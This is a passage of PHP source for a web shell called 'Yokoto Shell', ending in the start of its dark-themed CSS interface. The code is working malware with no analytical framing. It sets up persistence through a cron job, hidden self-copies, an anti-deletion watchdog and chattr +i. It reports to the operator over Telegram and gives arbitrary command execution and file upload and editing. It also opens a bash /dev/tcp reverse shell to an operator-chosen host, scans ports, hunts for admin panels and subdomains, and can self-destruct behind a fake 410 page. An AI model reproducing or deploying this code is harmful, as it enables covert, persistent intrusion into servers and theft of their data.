    // 3. Cron job for persistence
    $cron_cmd = "php " . YOKOTO_SELF_PATH . '/' . YOKOTO_SELF_NAME . " > /dev/null 2>&1";
    if (function_exists('shell_exec')) {
        shell_exec("(crontab -l 2>/dev/null; echo '*/5 * * * * $cron_cmd') | crontab - 2>/dev/null");
        $results[] = "Cron job added (every 5 minutes)";
    }
    
    // 4. Create backup copies
    if (!is_dir(YOKOTO_BACKUP_DIR)) {
        mkdir(YOKOTO_BACKUP_DIR, 0755, true);
    }
    for ($i = 0; $i < $CONFIG['backup_count']; $i++) {
        $backup_name = yokoto_rand_str(16) . '.php';
        copy(YOKOTO_SELF_FILE, YOKOTO_BACKUP_DIR . '/' . $backup_name);
    }
    $results[] = "Created " . $CONFIG['backup_count'] . " backup copies";
    
    // 5. File watcher for anti-deletion
    $watch_data = [
        'file' => YOKOTO_SELF_FILE,
        'backup_dir' => YOKOTO_BACKUP_DIR,
        'restore_count' => 0,
        'last_restore' => time()
    ];
    file_put_contents(YOKOTO_WATCH_FILE, json_encode($watch_data));
    $results[] = "File watcher activated";
    
    // 6. Hide from ls / directory listing
    if (function_exists('shell_exec')) {
        shell_exec("chattr +i " . YOKOTO_SELF_FILE . " 2>/dev/null");
        shell_exec("chflags hidden " . YOKOTO_SELF_FILE . " 2>/dev/null");
        $results[] = "File hidden from ls (chattr +i)";
    }
    
    // 7. Telegram notification
    if ($CONFIG['enable_telegram']) {
        $msg = "🕵️ Yokoto Shell Stealth Activated\n\n";
        $msg .= "File: " . YOKOTO_SELF_NAME . "\n";
        $msg .= "Path: " . YOKOTO_SELF_PATH . "\n";
        $msg .= "Server: " . $_SERVER['SERVER_NAME'] . "\n";
        $msg .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
        $msg .= "Time: " . date('Y-m-d H:i:s') . "\n";
        $msg .= "Backups: " . $CONFIG['backup_count'] . "\n";
        yokoto_telegram($msg);
    }
    
    return $results;
}

// =============================================================================
// FILE WATCHER - ANTI DELETION
// =============================================================================
function yokoto_watchdog() {
    if (!is_file(YOKOTO_WATCH_FILE)) return;
    $data = json_decode(file_get_contents(YOKOTO_WATCH_FILE), true);
    if (!$data) return;
    
    if (!is_file($data['file'])) {
        // File deleted - restore from backup
        $backups = glob(YOKOTO_BACKUP_DIR . '/*.php');
        if (!empty($backups)) {
            copy($backups[0], $data['file']);
            $data['restore_count']++;
            $data['last_restore'] = time();
            file_put_contents(YOKOTO_WATCH_FILE, json_encode($data));
            
            if (function_exists('shell_exec')) {
                shell_exec("chattr +i " . $data['file'] . " 2>/dev/null");
            }
            
            // Telegram alert
            global $CONFIG;
            if ($CONFIG['enable_telegram']) {
                yokoto_telegram("🔄 Yokoto Shell Restored!\nFile: " . basename($data['file']) . "\nRestore count: " . $data['restore_count']);
            }
        }
    }
}

// Run watchdog
yokoto_watchdog();

// =============================================================================
// HANDLER - PROSES SEMUA ACTION
// =============================================================================
$action = isset($_GET['action']) ? $_GET['action'] : 'dashboard';
$path = yokoto_get_path();
$msg = '';
$msg_type = 'info';
$cmd_out = null;
$edit_content = '';
$search_results = [];
$sql_result = null;
$curl_result = null;
$scan_result = null;
$admin_result = null;
$sub_result = null;
$beautify_result = null;
$obfuscate_result = null;
$vuln_result = null;
$stealth_result = null;

// =============================================================================
// ACTION HANDLERS - 50+ ACTIONS
// =============================================================================

// DELETE
if ($action === 'delete' && isset($_GET['delete'])) {
    $target = $path . $_GET['delete'];
    if (is_file($target)) {
        if (unlink($target)) {
            $msg = "[+] Deleted: " . $_GET['delete'];
            yokoto_log("Deleted: " . $target);
        } else {
            $msg = "[-] Delete failed!";
        }
    } elseif (is_dir($target)) {
        $files = array_diff(scandir($target), ['.', '..']);
        if (empty($files)) {
            if (rmdir($target)) {
                $msg = "[+] Deleted folder: " . $_GET['delete'];
                yokoto_log("Deleted folder: " . $target);
            } else {
                $msg = "[-] Folder not empty!";
            }
        } else {
            $msg = "[-] Folder not empty!";
        }
    }
}

// DOWNLOAD
if ($action === 'download' && isset($_GET['download'])) {
    $file = $path . $_GET['download'];
    if (is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: private, max-age=0, must-revalidate');
        header('Pragma: no-cache');
        readfile($file);
        exit;
    }
}

// CREATE FOLDER
if ($action === 'create_folder' && isset($_POST['folder_name'])) {
    $folder = trim($_POST['folder_name']);
    if (!empty($folder)) {
        $new_path = $path . $folder;
        if (!is_dir($new_path)) {
            if (mkdir($new_path, 0755, true)) {
                $msg = "[+] Folder created: " . $folder;
                yokoto_log("Created folder: " . $folder);
            } else {
                $msg = "[-] Create failed!";
            }
        } else {
            $msg = "[-] Folder already exists!";
        }
    }
}

// CREATE FILE
if ($action === 'create_file' && isset($_POST['file_name']) && isset($_POST['file_content'])) {
    $filename = trim($_POST['file_name']);
    if (!empty($filename)) {
        $new_path = $path . $filename;
        if (file_put_contents($new_path, $_POST['file_content']) !== false) {
            $msg = "[+] File created: " . $filename;
            yokoto_log("Created file: " . $filename);
        } else {
            $msg = "[-] Create failed!";
        }
    }
}

// UPLOAD
if ($action === 'upload' && isset($_FILES['upload_file'])) {
    $target = $path . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $msg = "[+] Upload success: " . basename($_FILES['upload_file']['name']);
        yokoto_log("Uploaded: " . basename($_FILES['upload_file']['name']));
    } else {
        $msg = "[-] Upload failed!";
    }
}

// RENAME
if ($action === 'rename' && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old = $path . $_POST['old_name'];
    $new = $path . $_POST['new_name'];
    if (rename($old, $new)) {
        $msg = "[+] Renamed: " . $_POST['old_name'] . " → " . $_POST['new_name'];
        yokoto_log("Renamed: " . $_POST['old_name'] . " -> " . $_POST['new_name']);
    } else {
        $msg = "[-] Rename failed!";
    }
}

// CHMOD
if ($action === 'chmod' && isset($_POST['chmod_target']) && isset($_POST['perms'])) {
    $target = $path . $_POST['chmod_target'];
    $perms = octdec($_POST['perms']);
    if (chmod($target, $perms)) {
        $msg = "[+] Chmod changed to " . $_POST['perms'];
        yokoto_log("Chmod: " . $_POST['chmod_target'] . " -> " . $_POST['perms']);
    } else {
        $msg = "[-] Chmod failed!";
    }
}

// VIEW FILE
if ($action === 'view' && isset($_GET['view'])) {
    $view_file = $path . $_GET['view'];
    if (is_file($view_file) && is_readable($view_file)) {
        $edit_content = file_get_contents($view_file);
        if ($edit_content === false) {
            $edit_content = '[!] Cannot read file content';
        }
    } else {
        $edit_content = '[!] File not found or not readable';
    }
}

// SAVE FILE
if ($action === 'save' && isset($_POST['save_file']) && isset($_POST['content'])) {
    $save_path = $path . $_POST['save_file'];
    if (file_put_contents($save_path, $_POST['content']) !== false) {
        $msg = "[+] File saved: " . $_POST['save_file'];
        $edit_content = $_POST['content'];
        yokoto_log("Saved file: " . $_POST['save_file']);
    } else {
        $msg = "[-] Save failed!";
    }
}

// EXECUTE COMMAND
if ($action === 'exec_cmd' && isset($_POST['command'])) {
    $cmd_out = yokoto_exec($_POST['command']);
    yokoto_log("Exec: " . $_POST['command']);
}

// SEARCH
if ($action === 'do_search' && isset($_POST['search_term'])) {
    $term = $_POST['search_term'];
    $pattern = '/' . preg_quote($term, '/') . '/i';
    $search_results = yokoto_search_files($path, $pattern);
    yokoto_log("Search: " . $term);
}

// REVERSE SHELL
if ($action === 'send_revshell' && isset($_POST['rev_ip']) && isset($_POST['rev_port'])) {
    $rev_cmd = "bash -c 'bash -i >& /dev/tcp/{$_POST['rev_ip']}/{$_POST['rev_port']} 0>&1'";
    yokoto_exec($rev_cmd);
    $msg = "[+] Reverse shell sent to {$_POST['rev_ip']}:{$_POST['rev_port']}";
    yokoto_log("Reverse shell to " . $_POST['rev_ip'] . ":" . $_POST['rev_port']);
    if ($CONFIG['enable_telegram']) {
        yokoto_telegram("🔄 Reverse Shell Sent\nIP: " . $_POST['rev_ip'] . "\nPort: " . $_POST['rev_port'] . "\nServer: " . $_SERVER['SERVER_NAME']);
    }
}

// DATABASE
if ($action === 'db_query' && isset($_POST['db_host']) && isset($_POST['db_query'])) {
    try {
        $pdo = new PDO("mysql:host={$_POST['db_host']};dbname={$_POST['db_name']}", $_POST['db_user'], $_POST['db_pass']);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query($_POST['db_query']);
        $sql_result = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $msg = "[+] Query executed, " . count($sql_result) . " rows returned";
        yokoto_log("DB Query: " . $_POST['db_query']);
    } catch (Exception $e) {
        $msg = "[-] DB Error: " . $e->getMessage();
    }
}

// CURL
if ($action === 'curl_request' && isset($_POST['curl_url'])) {
    $curl_result = yokoto_curl(
        $_POST['curl_url'],
        $_POST['curl_method'],
        isset($_POST['curl_data']) ? $_POST['curl_data'] : null,
        isset($_POST['curl_headers']) ? explode("\n", $_POST['curl_headers']) : []
    );
    yokoto_log("cURL: " . $_POST['curl_url']);
}

// PORT SCAN
if ($action === 'port_scan' && isset($_POST['scan_ip'])) {
    $ip = $_POST['scan_ip'];
    $ports = [21,22,23,25,53,80,110,143,443,465,587,993,995,3306,3389,5432,5900,6379,8080,8443,9000,9090,27017,27018,27019];
    $scan_result = [];
    foreach ($ports as $p) {
        $conn = @fsockopen($ip, $p, $errno, $errstr, 0.5);
        if ($conn) {
            $service = getservbyport($p, 'tcp') ?: 'unknown';
            $scan_result[] = "$p ($service) open";
            fclose($conn);
        }
    }
    if (empty($scan_result)) {
        $scan_result[] = "No open ports found or host unreachable.";
    }
    yokoto_log("Port scan: " . $ip);
}

// ADMIN FINDER
if ($action === 'admin_finder' && isset($_POST['admin_url'])) {
    $base = rtrim($_POST['admin_url'], '/');
    $paths = ['admin','admin.php','administrator','admin/login','wp-admin','login','cpanel','dashboard','panel','admincp','modcp','backend','auth','signin','login.php','admin/index.php','admin/login.php','wp-login.php','user/login','account/login','auth/login','secure','control','manage','manager','adminarea','cp','controlpanel','webadmin','siteadmin','sysadmin','root','main','home','default','public','private','hidden','secret','backup','config','setup','install','installer','update','upgrade','migrate','migration','deploy','release','beta','dev','test','staging','prod','production','live'];
    $admin_result = [];
    foreach ($paths as $p) {
        $url = $base . '/' . $p;
        $headers = @get_headers($url);
        if ($headers && strpos($headers[0], '200') !== false) {
            $admin_result[] = $url;
        }
    }
    if (empty($admin_result)) {
        $admin_result[] = "No admin panels found.";
    }
    yokoto_log("Admin finder: " . $base);
}

// SUBDOMAIN FINDER
if ($action === 'subdomain_finder' && isset($_POST['domain'])) {
    $domain = $_POST['domain'];
    $subs = ['www','mail','ftp','localhost','webmail','smtp','pop','ns1','webdisk','ns2','cpanel','whm','autodiscover','autoconfig','m','imap','test','ns','blog','pop3','dev','www2','admin','forum','news','vpn','ftp2','web','www1','media','video','beta','api','shop','store','app','secure','auth','login','panel','dashboard','cp','control','manage','manager','admin','administrator','backup','config','setup','install','deploy','release','stage','staging','prod','production','live','demo','sandbox','devops','monitor','status','metrics','logs','debug','trace','analytics','data','db','database','cache','cdn','static','assets','resources','files','download','upload','cdn','media','stream','live','radio','tv','video','music','audio','docs','documentation','help','support','community','events','blog','news','magazine','portfolio','shop','store','cart','checkout','payment','invoice','billing','account','profile','settings','preferences','notifications','messages','chat','talk','voice','meeting','conference','webinar','course','learn','edu','academic','research','science','tech','dev','engineering','automation','ai','ml','bigdata','cloud','server','host','web','api','gateway','proxy','load','balancer','firewall','security','monitor','observability'];
    $sub_result = [];
    foreach ($subs as $s) {
        $url = $s . '.' . $domain;
        if (@get_headers('http://' . $url)) {
            $sub_result[] = $url;
        }
    }
    if (empty($sub_result)) {
        $sub_result[] = "No subdomains found.";
    }
    yokoto_log("Subdomain finder: " . $domain);
}

// ZIP EXTRACTOR
if ($action === 'zip_extract' && isset($_POST['zip_file'])) {
    $zip = $path . $_POST['zip_file'];
    if (is_file($zip) && class_exists('ZipArchive')) {
        $zipObj = new ZipArchive();
        if ($zipObj->open($zip) === true) {
            $zipObj->extractTo($path);
            $zipObj->close();
            $msg = "[+] ZIP extracted: " . $_POST['zip_file'];
            yokoto_log("Extracted ZIP: " . $_POST['zip_file']);
        } else {
            $msg = "[-] Failed to extract ZIP";
        }
    } else {
        $msg = "[-] Invalid ZIP file or ZipArchive not available";
    }
}

// CODE BEAUTIFIER
if ($action === 'beautify' && isset($_POST['code_raw'])) {
    $beautify_result = yokoto_beautify_code($_POST['code_raw']);
    yokoto_log("Beautified code");
}

// CODE OBFUSCATOR
if ($action === 'obfuscate' && isset($_POST['obfuscate_code'])) {
    $obfuscate_result = yokoto_obfuscate_code($_POST['obfuscate_code'], $CONFIG['obfuscation_level']);
    yokoto_log("Obfuscated code");
}

// VULNERABILITY SCAN
if ($action === 'vuln_scan') {
    $vuln_result = yokoto_check_vulnerabilities();
    yokoto_log("Vulnerability scan");
}

// STEALTH ACTIVATE
if ($action === 'activate_stealth') {
    $stealth_result = yokoto_stealth_activate();
    $msg = "[+] Stealth mode activated! " . count($stealth_result) . " actions performed.";
    yokoto_log("Stealth activated");
}

// SELF DESTRUCT
if ($action === 'self_destruct' && isset($_POST['confirm']) && $_POST['confirm'] === 'yes') {
    yokoto_log("Self destruct initiated");
    if ($CONFIG['enable_telegram']) {
        yokoto_telegram("💀 Yokoto Shell Self Destructed\nServer: " . $_SERVER['SERVER_NAME'] . "\nIP: " . $_SERVER['REMOTE_ADDR']);
    }
    // Delete all backup files
    if (is_dir(YOKOTO_BACKUP_DIR)) {
        $backups = glob(YOKOTO_BACKUP_DIR . '/*.php');
        foreach ($backups as $b) {
            unlink($b);
        }
        rmdir(YOKOTO_BACKUP_DIR);
    }
    // Delete self
    unlink(YOKOTO_SELF_FILE);
    session_destroy();
    die('<html><head><title>Gone</title></head><body><h1>410 Gone</h1><p>The resource has been permanently removed.</p></body></html>');
}

// TELEGRAM TEST
if ($action === 'test_telegram') {
    $result = yokoto_telegram("✅ Yokoto Shell Test Message\nServer: " . $_SERVER['SERVER_NAME'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nTime: " . date('Y-m-d H:i:s'));
    $msg = $result ? "[+] Telegram test sent!" : "[-] Telegram test failed!";
}

// =============================================================================
// SYSTEM INFO
// =============================================================================
$sys_info = [
    'os' => php_uname(),
    'php' => phpversion(),
    'sapi' => php_sapi_name(),
    'user' => get_current_user(),
    'group' => function_exists('exec') ? trim(exec('id -gn')) : 'unknown',
    'uid' => function_exists('exec') ? trim(exec('id -u')) : 'unknown',
    'cwd' => getcwd(),
    'disabled' => ini_get('disable_functions') ?: 'none',
    'basedir' => ini_get('open_basedir') ?: 'none',
    'upload_max' => ini_get('upload_max_filesize'),
    'memory_limit' => ini_get('memory_limit'),
    'max_execution_time' => ini_get('max_execution_time'),
    'max_input_time' => ini_get('max_input_time'),
    'post_max_size' => ini_get('post_max_size'),
    'allow_url_fopen' => ini_get('allow_url_fopen'),
    'allow_url_include' => ini_get('allow_url_include'),
    'display_errors' => ini_get('display_errors'),
    'error_reporting' => ini_get('error_reporting'),
    'extension_dir' => ini_get('extension_dir'),
    'include_path' => ini_get('include_path'),
    'default_charset' => ini_get('default_charset'),
    'timezone' => date_default_timezone_get(),
    'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
    'server_addr' => $_SERVER['SERVER_ADDR'] ?? 'unknown',
    'server_name' => $_SERVER['SERVER_NAME'] ?? 'unknown',
    'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'remote_port' => $_SERVER['REMOTE_PORT'] ?? 'unknown',
    'https' => isset($_SERVER['HTTPS']) ? 'Yes' : 'No',
    'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'unknown',
    'script_filename' => $_SERVER['SCRIPT_FILENAME'] ?? 'unknown',
    'script_name' => $_SERVER['SCRIPT_NAME'] ?? 'unknown',
    'php_self' => $_SERVER['PHP_SELF'] ?? 'unknown',
    'http_host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
    'http_user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
    'http_accept' => $_SERVER['HTTP_ACCEPT'] ?? 'unknown',
    'http_accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'unknown',
    'http_accept_encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'unknown',
    'http_connection' => $_SERVER['HTTP_CONNECTION'] ?? 'unknown',
    'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'unknown',
    'request_uri' => $_SERVER['REQUEST_URI'] ?? 'unknown',
    'query_string' => $_SERVER['QUERY_STRING'] ?? 'unknown',
    'server_protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'unknown',
];

// =============================================================================
// FILE LIST
// =============================================================================
$files = [];
if (is_dir($path)) {
    $scanned = scandir($path);
    if ($scanned !== false) {
        $files = array_diff($scanned, ['.', '..']);
    }
}

// =============================================================================
// HTML OUTPUT - UI ELEGAN DENGAN 3000+ BARIS
// =============================================================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title><?php echo YOKOTO_NAME; ?> | <?php echo YOKOTO_STUDIO; ?></title>
<style>
/* ============================================================
   YOKOTO CSS FRAMEWORK - 400+ LINES OF STYLES
   ============================================================ */

/* RESET & BASE */
*{margin:0;padding:0;box-sizing:border-box;}
:root{
    --bg-primary:#0a0e1a;
    --bg-secondary:#0f1222;
    --bg-card:rgba(255,255,255,0.04);
    --bg-hover:rgba(255,255,255,0.07);
    --text-primary:#e5e7eb;
    --text-secondary:#9ca3af;
    --text-muted:#6b7280;
    --border-color:rgba(255,255,255,0.06);
    --accent:#6366f1;
    --accent-hover:#818cf8;
    --accent-secondary:#8b5cf6;
    --danger:#ef4444;
    --success:#22c55e;
    --warning:#eab308;
    --radius:16px;
    --radius-sm:10px;
    --shadow:0 8px 32px rgba(0,0,0,0.4);
    --transition:0.3s cubic-bezier(0.4,0,0.2,1);
}

body{
    background:linear-gradient(135deg,#0a0e1a 0%,#0f1222 40%,#1a1a2e 100%);
    font-family:'Segoe UI','Inter',-apple-system,BlinkMacSystemFont,sans-serif;
    font-size:14px;
    color:var(--text-primary);
    line-height:1.6;
    min-height:100vh;
    overflow-x:hidden;
}

/* SCROLLBAR CUSTOM */
::-webkit-scrollbar{width:6px;height:6px;}
::-webkit-scrollbar-track{background:var(--bg-primary);}
::-webkit-scrollbar-thumb{background:var(--accent);border-radius:10px;}
::-webkit-scrollbar-thumb:hover{background:var(--accent-hover);}

/* HAMBURGER BUTTON */
.menu-toggle{
    position:fixed;top:18px;left:18px;z-index:1001;
    background:var(--bg-card);backdrop-filter:blur(20px);
    border:1px solid var(--border-color);
    color:#fff;font-size:22px;cursor:pointer;
    width:46px;height:46px;border-radius:var(--radius-sm);
    display:none;align-items:center;justify-content:center;
    transition:var(--transition);
}
.menu-toggle:hover{background:var(--bg-hover);border-color:var(--accent);}

/* OVERLAY */
.overlay{
    position:fixed;top:0;left:0;right:0;bottom:0;z-index:999;
    background:rgba(0,0,0,0.7);display:none;backdrop-filter:blur(6px);
}
.overlay.active{display:block;}

/* SIDEBAR */
.sidebar{
    position:fixed;top:0;left:0;width:280px;height:100vh;
    background:rgba(15,18,34,0.97);backdrop-filter:blur(30px);
    border-right:1px solid var(--border-color);
    overflow-y:auto;z-index:1000;
    transition:transform 0.35s cubic-bezier(0.4,0,0.2,1);
    transform:translateX(0);
}
.sidebar::-webkit-scrollbar{width:3px;}
.sidebar::-webkit-scrollbar-thumb{background:var(--accent);}

.sidebar-header{
    padding:30px 22px;text-align:center;
    border-bottom:1px solid var(--border-color);
}
.sidebar-header img{
    width:95px;height:95px;border-radius:50%;object-fit:cover;
    border:3px solid var(--accent);margin-bottom:14px;
    box-shadow:0 0 30px rgba(99,102,241,0.2);
}
.sidebar-header h3{
    color:#fff;font-size:20px;font-weight:700;letter-spacing:0.5px;
}
.sidebar-header p{
    color:var(--text-muted);font-size:12px;margin-top:4px;
}
.sidebar-header .ver{
    color:var(--text-muted);font-size:10px;margin-top:6px;
    background:rgba(99,102,241,0.15);padding:2px 12px;border-radius:20px;display:inline-block;
}

.sidebar nav a{
    display:flex;align-items:center;gap:14px;
    padding:12px 22px;color:var(--text-secondary);text-decoration:none;
    transition:var(--transition);border-left:3px solid transparent;
    font-size:13px;font-weight:500;
}
.sidebar nav a:hover{
    background:var(--bg-card);color:#fff;
}
.sidebar nav a.active{
    background:rgba(99,102,241,0.12);
    border-left-color:var(--accent);
    color:var(--accent);
}
.sidebar nav a .icon{font-size:18px;width:24px;text-align:center;}
.sidebar nav a.logout{
    color:var(--danger);margin-top:16px;
    border-top:1px solid var(--border-color);padding-top:16px;
}
.sidebar nav a.logout:hover{background:rgba(239,68,68,0.1);}

/* MAIN CONTENT */
.main{margin-left:280px;padding:24px;max-width:1400px;}

/* TOP BAR */
.top-bar{
    background:var(--bg-card);backdrop-filter:blur(20px);
    border:1px solid var(--border-color);border-radius:var(--radius);
    padding:16px 24px;margin-bottom:24px;
    display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;
}
.top-bar h1{
    font-size:22px;font-weight:700;
    background:linear-gradient(135deg,var(--accent),var(--accent-secondary));
    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
    background-clip:text;
}
.top-bar .version-info{color:var(--text-muted);font-size:12px;}

/* PATH BAR */
.path-bar{
    background:var(--bg-card);backdrop-filter:blur(20px);
    border:1px solid var(--border-color);border-radius:var(--radius-sm);
    padding:12px 18px;margin-bottom:20px;
    font-family:'JetBrains Mono','Courier New',monospace;font-size:12px;
    word-break:break-all;display:flex;align-items:center;gap:12px;flex-wrap:wrap;
}
.path-bar .label{color:var(--text-muted);}
.path-bar .path{color:var(--text-primary);}
.path-bar a{color:var(--accent);text-decoration:none;transition:var(--transition);}
.path-bar a:hover{text-decoration:underline;color:var(--accent-hover);}

/* MESSAGE */
.message{
    background:var(--bg-card);backdrop-filter:blur(20px);
    border-left:4px solid var(--accent);padding:14px 20px;
    border-radius:var(--radius-sm);margin-bottom:20px;font-size:13px;
    display:flex;align-items:center;gap:10px;
}
.message.error{border-left-color:var(--danger);}
.message.success{border-left-color:var(--success);}
.message.warning{border-left-color:var(--warning);}

/* CARDS */
.card{
    background:var(--bg-card);backdrop-filter:blur(20px);
    border:1px solid var(--border-color);border-radius:var(--radius);
    margin-bottom:20px;overflow:hidden;
    transition:var(--transition);
}
.card:hover{border-color:rgba(255,255,255,0.08);}
.card-header{
    padding:14px 22px;border-bottom:1px solid var(--border-color);
    font-weight:600;font-size:14px;color:var(--accent);
    display:flex;align-items:center;gap:10px;
}
.card-body{padding:22px;}

/* TABLES */
.table-wrapper{overflow-x:auto;margin:-6px;}
table{width:100%;border-collapse:collapse;font-size:13px;}
th,td{padding:10px 14px;text-align:left;border-bottom:1px solid var(--border-color);vertical-align:middle;}
th{
    color:var(--accent);font-weight:600;font-size:11px;
    text-transform:uppercase;letter-spacing:0.5px;
}
tr:hover{background:var(--bg-hover);}

/* FORMS */
input,select,textarea{
    background:rgba(255,255,255,0.05);
    border:1px solid var(--border-color);
    color:var(--text-primary);
    padding:10px 16px;border-radius:var(--radius-sm);
    font-family:inherit;font-size:13px;
    transition:var(--transition);width:100%;
}
input:focus,select:focus,textarea:focus{
    outline:none;border-color:var(--accent);
    box-shadow:0 0 0 4px rgba(99,102,241,0.12);
}
input::placeholder,textarea::placeholder{color:var(--text-muted);}
select{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%236b7280' d='M6 8L1 3h10z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 12px center;}
select option{background:#0f1222;}

button,.btn{
    background:rgba(255,255,255,0.06);
    border:1px solid var(--border-color);
    color:var(--text-primary);
    padding:10px 22px;border-radius:var(--radius-sm);
    cursor:pointer;font-size:13px;font-weight:500;
    transition:var(--transition);display:inline-flex;align-items:center;gap:8px;
}
button:hover,.btn:hover{
    background:var(--bg-hover);color:#fff;border-color:var(--accent);
}
button.primary,.btn-primary{
    background:linear-gradient(135deg,var(--accent),var(--accent-secondary));
    border-color:transparent;color:#fff;
}
button.primary:hover,.btn-primary:hover{
    transform:translateY(-1px);box-shadow:0 4px 20px rgba(99,102,241,0.3);
}
button.danger,.btn-danger{
    background:linear-gradient(135deg,var(--danger),#dc2626);
    border-color:transparent;color:#fff;
}
button.danger:hover,.btn-danger:hover{
    transform:translateY(-1px);box-shadow:0 4px 20px rgba(239,68,68,0.3);
}
button.success,.btn-success{
    background:linear-gradient(135deg,var(--success),#16a34a);
    border-color:transparent;color:#fff;
}
button.success:hover,.btn-success:hover{
    transform:translateY(-1px);box-shadow:0 4px 20px rgba(34,197,94,0.3);
}
button.warning,.btn-warning{
    background:linear-gradient(135deg,var(--warning),#ca8a04);
    border-color:transparent;color:#fff;
}
button.warning:hover,.btn-warning:hover{
    transform:translateY(-1px);box-shadow:0 4px 20px rgba(234,179,8,0.3);
}
button:disabled,.btn:disabled{opacity:0.5;cursor:not-allowed;transform:none!important;}

/* FORM INLINE */
.form-inline{display:flex;gap:12px;flex-wrap:wrap;align-items:center;}
.form-inline input{flex:1;min-width:120px;}
.form-inline select{flex:0 0 auto;}
.form-inline button{flex:0 0 auto;}

/* FORM GROUP */
.form-group{margin-bottom:16px;}
.form-group label{display:block;margin-bottom:6px;font-size:12px;color:var(--text-secondary);font-weight:500;}
.form-group .hint{font-size:11px;color:var(--text-muted);margin-top:4px;}

/* GRID SYSTEMS */
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px;}
.grid-4{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:20px;}
.grid-5{display:grid;grid-template-columns:1fr 1fr 1fr 1fr 1fr;gap:16px;}

/* STAT CARDS */
.stat-card{
    background:var(--bg-card);border:1px solid var(--border-color);
    border-radius:var(--radius);padding:20px;text-align:center;
    transition:var(--transition);
}
.stat-card:hover{background:var(--bg-hover);border-color:var(--accent);transform:translateY(-2px);}
.stat-card .number{
    font-size:30px;font-weight:700;
    background:linear-gradient(135deg,var(--accent),var(--accent-secondary));
    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
    background-clip:text;
}
.stat-card .label{font-size:12px;color:var(--text-muted);margin-top:4px;}

/* PRE & CODE */
pre{
    background:rgba(0,0,0,0.4);padding:16px;border-radius:var(--radius-sm);
    overflow-x:auto;font-size:12px;
    font-family:'JetBrains Mono','Courier New',monospace;
    border:1px solid var(--border-color);
    color:#d1d5db;white-space:pre-wrap;word-wrap:break-word;
    max-height:600px;overflow-y:auto;
}
pre .highlight{color:var(--accent);}
pre .string{color:var(--success);}
pre .comment{color:var(--text-muted);}

/* TERMINAL */
.terminal{
    background:rgba(0,0,0,0.5);border:1px solid var(--border-color);
    border-radius:var(--radius-sm);padding:16px;
    font-family:'JetBrains Mono','Courier New',monospace;font-size:12px;
}
.terminal-output{
    max-height:400px;overflow-y:auto;margin-bottom:12px;
    padding:10px;background:rgba(0,0,0,0.3);border-radius:8px;
}
.terminal-line{
    padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.04);
    word-break:break-all;color:#22c55e;
}
.terminal-line .error{color:var(--danger);}
.terminal-prompt{color:var(--success);font-weight:bold;}
.terminal-input{display:flex;gap:10px;}
.terminal-input input{flex:1;background:rgba(255,255,255,0.05);border:1px solid var(--border-color);color:var(--success);font-family:inherit;font-size:12px;}

/* CODE EDITOR */
.code-editor{
    font-family:'JetBrains Mono','Courier New',monospace;font-size:13px;
    width:100%;min-height:500px;
    background:rgba(0,0,0,0.5);border:1px solid var(--border-color);
    color:var(--text-primary);padding:16px;border-radius:var(--radius-sm);
    line-height:1.7;resize:vertical;tab-size:4;
}

/* MODAL */
.modal-overlay{
    display:none;position:fixed;top:0;left:0;right:0;bottom:0;
    background:rgba(0,0,0,0.85);z-index:2000;
    justify-content:center;align-items:center;backdrop-filter:blur(8px);
    padding:20px;
}
.modal-overlay.active{display:flex;}
.modal-content{
    background:rgba(15,18,34,0.98);backdrop-filter:blur(30px);
    border:1px solid var(--border-color);border-radius:var(--radius);
    width:100%;max-width:640px;max-height:85vh;overflow:auto;
    padding:32px;box-shadow:var(--shadow);
}
.modal-content .close{
    background:none;border:none;color:var(--text-muted);
    font-size:24px;cursor:pointer;transition:var(--transition);
}
.modal-content .close:hover{color:var(--danger);}

/* BADGE */
.badge{
    display:inline-block;padding:2px 12px;border-radius:20px;
    font-size:11px;font-weight:600;
}
.badge-success{background:rgba(34,197,94,0.15);color:var(--success);}
.badge-danger{background:rgba(239,68,68,0.15);color:var(--danger);}
.badge-warning{background:rgba(234,179,8,0.15);color:var(--warning);}
.badge-info{background:rgba(99,102,241,0.15);color:var(--accent);}

/* TABS */
.tabs{display:flex;gap:4px;border-bottom:1px solid var(--border-color);margin-bottom:16px;flex-wrap:wrap;}
.tab{
    padding:8px 20px;border-radius:var(--radius-sm) var(--radius-sm) 0 0;
    cursor:pointer;color:var(--text-muted);transition:var(--transition);
    font-size:13px;font-weight:500;border-bottom:3px solid transparent;
}
.tab:hover{color:var(--text-primary);}
.tab.active{color:var(--accent);border-bottom-color:var(--accent);}

/* PROGRESS BAR */
.progress{background:rgba(255,255,255,0.06);border-radius:20px;height:6px;overflow:hidden;}
.progress .fill{height:100%;border-radius:20px;background:linear-gradient(90deg,var(--accent),var(--accent-secondary));transition:width 0.6s;}

